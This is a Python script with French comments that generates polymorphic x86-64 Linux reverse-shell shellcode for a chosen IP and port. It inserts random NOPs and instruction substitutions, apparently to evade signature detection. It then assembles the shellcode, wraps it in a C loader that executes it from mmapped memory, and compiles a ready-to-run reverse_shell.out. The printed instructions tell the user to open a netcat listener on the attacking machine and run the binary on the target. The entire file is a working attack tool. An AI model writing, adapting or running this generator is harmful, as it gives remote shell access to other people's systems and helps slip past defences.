import subprocess
import socket
import struct
import argparse
import tempfile
import os
import random

# Logo à afficher au démarrage du script
logo = """       ...                                      ..       ..
   .x888888hx    :   .uef^"               x .d88"  x .d88"             _.-''|''-._
  d88888888888hxx  :d88E                   5888R    5888R           .-'     |     `-.
 8" ... `"*8888%`  `888E            .u     '888R    '888R         .'\       |       /`.
!  "   ` .xnxx.     888E .z8k    ud8888.    888R     888R       .'   \    CODE     /   `.
X X   .H8888888%:   888E~?888L :888'8888.   888R     888R       \     \     |     /     /
X 'hn8888888*"   >  888E  888E d888 '88%"   888R     888R        `\    \    |    /    /'
X: `*88888%`     !  888E  888E 8888.+"      888R     888R          `\   \   |   /   /'
'8h.. ``     ..x8>  888E  888E 8888L        888R     888R            `\  \  |  /  /'
 `88888888888888f   888E  888E '8888c. .+  .888B .  .888B .         _.-`\ \ | / /'-._
  '%8888888888*"   m888N= 888>  "88888%    ^*888%   ^*888%         {_____`\\|//'_____}
     ^"****""`      `Y"   888     "YP'       "%       "%                   `-'
                         J88"                                                                            
                         @%                                                                              
                       :"                                                                                """

barre = """
=========================================================================================
"""

# Fonction pour colorer le texte en bleu
def print_blue(text):
    print(f"\033[94m{text}\033[0m")

# Fonction pour colorer le texte en bleu clair
def print_cyan(text):
    print(f"\033[38;5;87m{text}\033[0m")

# Fonction pour colorer le texte en Orange
def print_orange(text):
    print(f"\033[38;5;208m{text}\033[0m")   

# Fonction pour colorer le texte en rouge
def print_red(text):
    print(f"\033[91m{text}\033[0m")


# Incrémente de manière sécurisée un octet pour éviter l'introduction de nuls bytes
def safe_increment(byte):
    if byte == 0xff:
        return 0x01  # Pour éviter les nuls bytes
    return byte + 1

# Décrémente de manière sécurisée une chaîne codée en hexa
def safe_decrement(encoded_str):
    return ''.join(chr(safe_increment(int(encoded_str[i:i+2], 16)) - 2) for i in range(0, len(encoded_str), 2))

# Encode une adresse IP en évitant les nuls bytes et la convertit en little-endian
def encode_ip(ip):
    try:
        packed_ip = socket.inet_aton(ip)
        incremented = [safe_increment(b) for b in packed_ip]
        incremented.reverse()  # Convertir en little-endian pour la compatibilité du système
        return ''.join(f"{b:02x}" for b in incremented)
    except socket.error as e:
        print_red(f"Erreur lors de la conversion de l'adresse IP '{ip}': {e}")
        return None

# Encode un port en format little-endian et en évitant les nuls bytes
def encode_port(port):
    packed_port = struct.pack('<H', port)  # Utilisation de little-endian
    incremented = [safe_increment(b) for b in packed_port]
    return ''.join(f"{b:02x}" for b in incremented)

# Décode une adresse IP à partir de sa représentation hexadécimale encodée
def decode_ip(encoded_ip_hex):
    bytes_ip = [encoded_ip_hex[i:i+2] for i in range(0, len(encoded_ip_hex), 2)]
    # Convertir de nouveau en adresse IP normale après décrément de chaque octet
    decoded_ip = [str(int(b, 16) - 1) for b in bytes_ip]
    return '.'.join(decoded_ip)

# Décode un port à partir de sa représentation hexadécimale encodée
def decode_port(encoded_port_hex):
    bytes_port = [encoded_port_hex[i:i+2] for i in range(0, len(encoded_port_hex), 2)]
    # Décrémente chaque octet et convertit de little-endian à un nombre
    decoded_port = [int(b, 16) - 1 for b in reversed(bytes_port)]
    port_number = 0
    for byte in decoded_port:
        port_number = (port_number << 8) | byte
    return port_number

# Génère un nombre aléatoire de nops en format d'assembleur
def generate_random_nops_as_asm():
    count = random.randint(1, 20)  # Générer un nombre aléatoire de nop entre 1 et 20
    return 'nop\n' * count  # Retourner les nops comme instructions d'assembleur

# Dictionnaire de transformations polymorphes
polymorphic_instructions = {
    'xor rax, rax': [
        'sub rax, rax',
        'xor rax, rax',
    ],
    'xor rbx, rbx': [
        'sub rbx, rbx',
        'xor rbx, rbx',
    ],
    'xor rcx, rcx': [
        'sub rcx, rcx',
        'xor rcx, rcx',
    ],
    'xor rdx, rdx': [
        'sub rdx, rdx',
        'xor rdx, rdx',
    ],
    'xor rdi, rdi': [
        'sub rdi, rdi',
        'xor rdi, rdi',
    ],
    'xor rsi, rsi': [
        'sub rsi, rsi',
        'xor rsi, rsi',
    ],
    'mov al, 33': [
        'mov al, 33',
        'xor rax, rax\nadd al, 33',
        'push 33\npop rax'
    ],
    'push r8': [
        'push r8',
        'sub rsp, 8\nmov [rsp], r8'
    ],
    'pop rdi': [
        'pop rdi',
        'mov rdi, [rsp]\nadd rsp, 8'
    ],
    'mov sil, 1': [
        'mov sil, 1',
        'xor rsi, rsi\nadd sil, 1'
    ],
    'syscall': [
        'syscall',
        'db 0x0f, 0x05'
    ]
}

# Sélectionne une transformation polymorphe aléatoire pour une instruction donnée
def get_polymorphic_instruction(instruction):
    if instruction in polymorphic_instructions:
        return random.choice(polymorphic_instructions[instruction])
    return instruction

# Compile le code assembleur en opcodes et extrait ces opcodes
def compile_and_extract_opcodes(asm_code, asm_filename):
    with open(asm_filename, 'w') as f:
        f.write(asm_code)

    obj_file = tempfile.mktemp(suffix='.o')
    # Compile le code assembleur en fichier objet
    subprocess.run(['nasm', '-f', 'elf64', '-o', obj_file, asm_filename], check=True)
    bin_file = tempfile.mktemp()
    # Lie le fichier objet pour créer un exécutable binaire
    subprocess.run(['ld', '-o', bin_file, obj_file], check=True)
    
    # Décompile le fichier binaire pour obtenir les opcodes
    result = subprocess.run(['objdump', '-d', bin_file], capture_output=True, text=True)
    opcodes = []
    for line in result.stdout.split('\n'):
        if '\t' in line and ':' in line:
            parts = line.split('\t')
            if len(parts) > 1:
                # Supprime les espaces supplémentaires et divise par espace
                opcode_parts = parts[1].strip().split(' ')
                # Filtre les chaînes vides et les éléments non-opcode
                opcodes.extend([op for op in opcode_parts if len(op) == 2 and all(c in "0123456789abcdef" for c in op)])


    # Formate la chaîne d'opcodes pour le shellcode
    formatted_opcodes = ''.join(f"\\x{op}" for op in opcodes if op)
    return formatted_opcodes

# Génère le shellcode pour une adresse IP et un port donnés
def generate_shellcode(ip, port, asm_filename):
    encoded_ip = encode_ip(ip)
    encoded_port = encode_port(port)

    asm_code = f"""
global _start

section .text

_start:
    ; Initialise tous les registres généraux à zéro pour éviter les interférences
    {get_polymorphic_instruction('xor rax, rax')}
    {get_polymorphic_instruction('xor rbx, rbx')}
    {get_polymorphic_instruction('xor rcx, rcx')}
    {get_polymorphic_instruction('xor rdx, rdx')}
    {get_polymorphic_instruction('xor rdi, rdi')}
    {get_polymorphic_instruction('xor rsi, rsi')}

    {generate_random_nops_as_asm()}     

    ; Crée un socket pour la communication réseau
    mov al, 41  ; syscall pour créer un socket
    mov dil, 2  ; Domaine AF_INET (IPv4)
    mov sil, 1  ; Type SOCK_STREAM (connexion orientée)
    mov dl, 6   ; Protocole TCP
    syscall     ; Exécuter le syscall

    {generate_random_nops_as_asm()} 

    ; Stocke le descripteur de socket retourné pour une utilisation ultérieure
    mov r8, rax
    sub rsp, 40
    mov byte [rsp], 0x2

    ; Encode et place le port et l'adresse IP dans le stack pour 'connect' et décrémente de 1 octet
    mov word [rsp+2], 0x{encoded_port}
    sub word [rsp+2], 0x0101

    mov dword [rsp+4], 0x{encoded_ip}
    sub dword [rsp+4], 0x01010101

    ; Prépare les arguments pour la fonction 'connect'
    mov rsi, rsp
    mov dl, 16
    push r8
    pop rdi
    mov al, 42
    syscall  ; syscall pour connecter le socket

    {generate_random_nops_as_asm()}    
    
    {get_polymorphic_instruction('mov al, 33')}
    {get_polymorphic_instruction('push r8')}
    {get_polymorphic_instruction('pop rdi')}
    {get_polymorphic_instruction('xor rsi, rsi')}
    {get_polymorphic_instruction('syscall')}  ; dup2(socket, STDIN)

    {generate_random_nops_as_asm()}      
    
    {get_polymorphic_instruction('mov al, 33')}  ; RAX prends la valeur 33 (numéro du syscall SYS_DUP2)
    {get_polymorphic_instruction('push r8')}
    {get_polymorphic_instruction('pop rdi')}
    {get_polymorphic_instruction('mov sil, 1')}  ; RSI prends la valeur 1 qui vaut STDOUT (sortie utilisateur)
    {get_polymorphic_instruction('syscall')}

    {get_polymorphic_instruction('mov al, 33')}  ; RAX prends la valeur 33 (numéro du syscall SYS_DUP2)
    {get_polymorphic_instruction('push r8')}
    {get_polymorphic_instruction('pop rdi')}
    {get_polymorphic_instruction('mov sil, 2')}  ; RSI prends la valeur 2 qui vaut STDERR (affichage d'erreurs)
    {get_polymorphic_instruction('syscall')}

    xor rsi, rsi    ; Efface RSI en le mettant à zéro
    push rsi        ; On push sur la stack un pointeur NULL pour les arguments de la fonction execve
    mov rdi, 0x68732f2f6e69622f   ; Charge l'adresse de la chaîne "/bin//sh" dans RDI.
    push rdi        ; On push sur la stack l'adresse de la chaîne "/bin//sh"
    push rsp        ; On push l'adresse actuelle de la stack (pointeur vers la chaîne "/bin//sh")
    pop rdi         ; RDI récupère l'adresse de la chaîne "/bin//sh"
    mov al, 59      ; RAX prends la valeur 59 (numéro du syscall SYS_EXECVE)
    cdq             ; Étend le signe de EAX vers EDX pour que RDX contienne 0
    
    ; Cela signifie qu'il n'y a pas d'arguments à passer à execve
    syscall ; Appelle la fonction execve pour exécuter le shell "/bin//sh"
    """
    return compile_and_extract_opcodes(asm_code, asm_filename)

# Fonction permettant de créer un fichier en C qui contiendras le shellcode généré.
def create_c_file_with_shellcode(shellcode_opcodes):
    c_code = f'''
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
char shellcode[] = "{shellcode_opcodes}";
void main() {{
    printf("shellcode length: %u\\n", strlen(shellcode));
    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ |
                    PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}}
'''
    c_filename = 'shellcode.c'
    with open(c_filename, 'w') as f:
        f.write(c_code)
    return c_filename

# Fonction permettant de compiler le fichier C contenant le shellcode avec GCC afin d'obtenir un exécutable pret a l'emploi en .out
def compile_c_file(c_filename):
    subprocess.run(['gcc', c_filename, '-z', 'execstack', '-o', 'reverse_shell.out'], check=True)

def main():
    print_blue(barre)
    print_cyan(logo)
    print_blue(barre)
    parser = argparse.ArgumentParser(description="Générer un shellcode pour une IP et un port donnés")
    print_orange(f"Prerequisites to satisfy: \n\n -> sudo apt-get install nasm binutils gcc \n -> pip install argparse \n ")
    parser.add_argument("-i", "--ip", required=True, type=str, help="Adresse IP à encoder")
    parser.add_argument("-p", "--port", required=True, type=int, help="Port à encoder")
    
    args = parser.parse_args()
    encoded_ip = encode_ip(args.ip)
    if encoded_ip is None:
        print_blue("L'encodage de l'IP a échoué.")
        return
    
    encoded_port = encode_port(args.port)
    decoded_ip = decode_ip(encoded_ip)
    decoded_port = decode_port(encoded_port)
    asm_filename = 'generated_shellcode.asm'
    shellcode_opcodes = generate_shellcode(args.ip, args.port, asm_filename)
    print_cyan(f"                 Voici quelques informations concernant votre shellcode")
    print_blue(barre)
    print_blue(f"IP Encodée : \033[38;5;87m0x{encoded_ip}\033[0m")
    print_blue(f"IP Décodée : \033[38;5;87m{decoded_ip}\033[0m")
    print_blue(f"Port Encodé : \033[38;5;87m0x{encoded_port}\033[0m")
    print_blue(f"Port Décodé : \033[38;5;87m{decoded_port}\033[0m")
    print_blue(f"Shellcode écrit dans : \033[38;5;87m{asm_filename}\033[0m")
    print_blue(f"\nOpcodes du Shellcode : \033[38;5;87m{shellcode_opcodes}\033[0m")
    print_blue(f"\nLongueur des Opcodes du Shellcode : \033[38;5;87m{len(shellcode_opcodes)}\033[0m")

    c_filename = create_c_file_with_shellcode(shellcode_opcodes)
    compile_c_file(c_filename)
    print_blue(f"\nLe fichier \033[38;5;87m{c_filename}\033[0m \033[94ma été compilé avec succès en\033[0m \033[38;5;208mreverse_shell.out\033[0m")
    print_blue(barre)
    print_cyan(f"                 Comment fonctionne le reverse shell ?")
    print_blue(barre)
    print_blue(f"""1 - Ouvrir un écouteur Netcat sur la machine attaquante : \033[38;5;87mnc -lvnp {decoded_port}\033[0m
\033[94m2 - Lancer le reverse shell sur la machine cible :\033[0m \033[38;5;208m./reverse_shell.out\033[0m
\033[94m3 - Obtention d'une connexion sur l'écouteur netcat\033[0m
""")
if __name__ == "__main__":
    main()
